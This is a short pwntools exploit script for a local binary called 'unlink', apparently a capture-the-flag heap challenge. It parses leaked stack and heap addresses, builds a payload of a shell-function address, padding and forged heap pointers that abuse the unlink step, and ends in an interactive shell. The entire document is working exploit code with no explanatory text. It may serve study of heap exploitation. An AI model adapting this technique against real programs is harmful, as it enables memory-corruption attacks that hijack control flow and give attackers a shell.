from pwn import *
p = process('./unlink')
shell_addr = 0x80484eb
p.recvuntil('here is stack address leak: ')
stack_addr = p.recv(10)
p.recvuntil('here is heap address leak: ')
heap_addr = p.recv(9)
stack_addr = int(stack_addr, 16)
heap_addr = int(heap_addr, 16)
target_addr = stack_addr + 0x10 
payload  = p32(shell_addr)
payload += 'A' * 20
payload += p32(heap_addr + 12)
payload += p32(target_addr)
print payload.encode('hex')
p.sendlineafter('', payload)
raw_input()
p.interactive()
